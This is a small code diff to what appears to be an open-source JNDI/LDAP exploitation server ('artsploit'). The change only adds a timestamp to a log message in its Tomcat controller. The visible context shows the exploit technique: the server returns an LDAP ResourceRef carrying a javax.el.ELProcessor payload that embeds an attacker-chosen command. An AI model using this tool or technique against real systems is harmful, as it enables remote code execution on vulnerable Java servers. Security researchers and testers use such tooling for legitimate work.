@@ -9,6 +9,7 @@ import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
+import java.sql.Timestamp;
 
 import static artsploit.Utilities.makeJavaScriptString;
 import static artsploit.Utilities.serialize;
@@ -39,8 +40,8 @@ public class Tomcat implements LdapController {
             .replace("${command}", makeJavaScriptString(Config.command));
 
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-
-        System.out.println("Sending LDAP ResourceRef result for " + base + " with javax.el.ELProcessor payload");
+        Timestamp timestamp = new Timestamp(System.currentTimeMillis());
+        System.out.println(timestamp + " Sending LDAP ResourceRef result for " + base + " with javax.el.ELProcessor payload");
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
